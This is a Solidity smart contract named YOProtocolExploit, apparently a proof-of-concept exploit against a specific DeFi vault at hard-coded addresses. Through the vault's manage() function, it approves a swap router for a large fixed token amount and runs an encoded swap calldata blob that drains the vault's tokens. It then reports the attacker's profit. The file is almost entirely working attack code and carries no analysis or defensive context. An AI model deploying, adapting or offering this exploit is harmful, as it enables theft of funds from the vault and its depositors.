// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

interface IVault {
    function manage(
        address[] calldata targets,
        bytes[] calldata calldatas,
        uint256[] calldata values
    ) external returns (bytes[] memory);
}

interface IAccessControl {
    function canCall(address caller, address target, bytes4 selector) external view returns (bool);
}

contract YOProtocolExploit {

    address public constant VAULT = 0x0000000f2eB9f69274678c76222B35eEc7588a65;
    address public constant DRAINED_TOKEN = 0x1a88Df1cFe15Af22B3c4c783D4e6F7F9e0C1885d;
    address public constant SWAP_ROUTER = 0xCf5540fFFCdC3d510B18bFcA6d2b9987b0772559;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant ACCESS_CONTROL = 0x9524e25079b1b04D904865704783A5aA0202d44D;
    uint256 public constant DRAIN_AMOUNT = 3840651397502403762632376;
    event ExploitExecuted(
        address indexed attacker,
        uint256 vaultTokensBefore,
        uint256 vaultTokensAfter,
        uint256 attackerProfit
    );

    error NotAuthorized();
    error ExploitFailed();
    address public immutable attacker;

    constructor() {
        attacker = msg.sender;
    }

    function exploit() external returns (uint256 profit) {
        if (!_checkPermissions(msg.sender)) {
            revert NotAuthorized();
        }

        uint256 vaultTokensBefore = IERC20(DRAINED_TOKEN).balanceOf(VAULT);
        uint256 attackerTokensBefore = IERC20(DRAINED_TOKEN).balanceOf(tx.origin);
        address[] memory targets = new address[](2);
        targets[0] = DRAINED_TOKEN;
        targets[1] = SWAP_ROUTER;
        bytes[] memory calldatas = new bytes[](2);

        calldatas[0] = abi.encodeWithSelector(
            IERC20.approve.selector,
            SWAP_ROUTER,
            DRAIN_AMOUNT
        );

        calldatas[1] = _getSwapCompactCalldata();

        uint256[] memory values = new uint256[](2);
        values[0] = 0;
        values[1] = 0;

        IVault(VAULT).manage(targets, calldatas, values);

        uint256 vaultTokensAfter = IERC20(DRAINED_TOKEN).balanceOf(VAULT);
        uint256 attackerTokensAfter = IERC20(DRAINED_TOKEN).balanceOf(tx.origin);
        profit = attackerTokensAfter - attackerTokensBefore;

        emit ExploitExecuted(
            tx.origin,
            vaultTokensBefore,
            vaultTokensAfter,
            profit
        );

        if (vaultTokensAfter >= vaultTokensBefore) {
            revert ExploitFailed();
        }
    }

    function checkPermissions(address caller) external view returns (bool) {
        return _checkPermissions(caller);
    }

    function getVaultBalance() external view returns (uint256) {
        return IERC20(DRAINED_TOKEN).balanceOf(VAULT);
    }

    function getPreAttackState() external view returns (
        uint256 vaultTokenBalance,
        uint256 vaultUSDCBalance,
        bool hasManagePermission,
        bool hasApprovePermission,
        bool hasSwapPermission
    ) {
        vaultTokenBalance = IERC20(DRAINED_TOKEN).balanceOf(VAULT);
        vaultUSDCBalance = IERC20(USDC).balanceOf(VAULT);
        hasManagePermission = IAccessControl(ACCESS_CONTROL).canCall(
            msg.sender, VAULT, bytes4(0x224d8703)
        );
        hasApprovePermission = IAccessControl(ACCESS_CONTROL).canCall(
            msg.sender, DRAINED_TOKEN, bytes4(0x095ea7b3)
        );
        hasSwapPermission = IAccessControl(ACCESS_CONTROL).canCall(
            msg.sender, SWAP_ROUTER, bytes4(0x83bd37f9)
        );
    }

    function _checkPermissions(address caller) internal view returns (bool) {
        bool canManage = IAccessControl(ACCESS_CONTROL).canCall(
            caller,
            VAULT,
            bytes4(0x224d8703)
        );

        bool canApprove = IAccessControl(ACCESS_CONTROL).canCall(
            caller,
            DRAINED_TOKEN,
            bytes4(0x095ea7b3)
        );

        bool canSwap = IAccessControl(ACCESS_CONTROL).canCall(
            caller,
            SWAP_ROUTER,
            bytes4(0x83bd37f9)
        );

        return canManage && canApprove && canSwap;
    }

    function _getSwapCompactCalldata() internal pure returns (bytes memory) {
        return hex"83bd37f900011a88df1cfe15af22b3c4c783d4e6f7f9e0c1885d0001a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480b032d4a2123693a90eeb6b8051a15df9ee80147ae0001365084b05fa7d5028346bd21d842ed0601bab5b8000000010000000f2eb9f69274678c76222b35eec7588a65000000002f190f2301018a0e710e01000102010cf85000426800010943a04e0e01000102010493e0001770000100f669190e01000102010c3500003e800001007d4eb20e010001020103d09000138800010059af570e0100010201009c4000032000010046c9980e010001020100753000025800010075d6b70e01000102010061a80001f400010b55ba1d0e020001030107a120002710000101daabcb0e02000103010249f0000bb8000100170abb0e02000103010186a00007d00001007f4bf70e02000103010184ac0007c600010044d8ca0e0200010301010dec0005660001007d086e0e02000103010182b80007bc0001031bb5510e02000103010d1f60004330000103786b2c0e02000103010d23480043440001fd8da5810e03000104000d6d800044c000001b0400010501010754625b49000007755e0e2406050107002c3fca410600060407070760962d0e07000408010000640000010007003df0b00e0800040901000bb800003c000798914fdc0e0900040a010001f400000a0007a007ece30e0900040a010000640000010007042e15ce0e0900040a01000bb800003c0007fda471ef0e0a00040b010001f400000a000782bae19e0e0b00040c010027100000c800060e0c00040d01000bb800003c0003b7796021000303045e2397670d00010e02000102670e100110020001080d09001112010c4102001307030668020014020315161c670200000f1701000b00e0766f570200011812007fffffc40b5afa97f80d02001912000b63ce8add0d02001a12000bd3cddcce0d02001b12000b971c64390d02001c12000b2ff42b510e0200120300000064000001000a0e02001203000001f400000a00100d02001d090115e0884e440d02001e0b01152cc2e95b0e02000b03010001f400000a001455021f0b030100160e02000c03010001f400000a001a0e0200200301000064000001000e0e0200080300000064000001001300decad30e02000a03000000080000010012690200210a00013c2e98ff0e02000403010001f400000a0001249414d90e02000403010000640000010000690200220400180e02000d0301000bb800003c00040203ff000000000000000000001a88df1cfe15af22b3c4c783d4e6f7f9e0c1885d40d16fc0246ad3160ccc09b8d0d3a2cd28ae6c2fa0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000000000000000000000b23243cefe2718aa2a87221430e9f0736569b81eb1cd6e4153b2a390cf00a6556b0fc1458c4a55331f573d6fb3f13d689ff844b4ce37794d79a7ff1ccfcecfe2bd2fed07a9145222e8a7ad9cf1ccd22a6b175474e89094c44da98b954eedeac495271d0fdac17f958d2ee523a2206206994597c13d831ec72260fac5e5542a773aa44fbcfedf7c193bc2c5991abaea1f7c830bd89acc67ec4af516284b1bc33c1f9840a85d5af5bf1d1762f925bdaddc4201f9844628f13651ead6793f8d838b34b8f8522fb0cc525018be882dcce5e3f2f3b0913ae2096b9b3fb61f74345504eaea3d9408fc69ae7eb2d14095643c5bc7bbec68d12a0d1830360f8ec58fa599ba1b0e9bc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2874d8de5b26c9d9f6aa8d7bab283f9a9c6f777f485b2b559bc2d21104c4defdd6efca8a20343361dc71ea051a5f82c67adcf634c36ffe6334793d24cd4fa2d31b7968e448877f69a96de69f5de8cd23e085780639cc2cacd35e474e71f4d000e2405d8f6eb1da432d5c1a9fdf52aa5d37698f34706f913971445f32d1a74872ba41f3d8cf4022e9996120b3188e6a0c2ddd26feeb64f039a2c41296fcb3f5640e0554a476a092703abdb3ef35c80e0d76d32939f1ac1a8feaaea1900c4166deeed0c11cc10669d365777d92f208679db4b9778590fa3cab3ac9e21689a772018fbd77fcd2d25657e5c547baff3fd7d167f86bf177dd4f3494b841a37e810a34dd56c829b66a1e37c9b0eaddca17d3662d6c05f4decf3e110667701e51b4d1ca244f17c78f7ab8744b4c99f9b836951eb21f3df98273517b7249dceff270d34bf000000000000000000000000000000000000000000000000";
    }
}
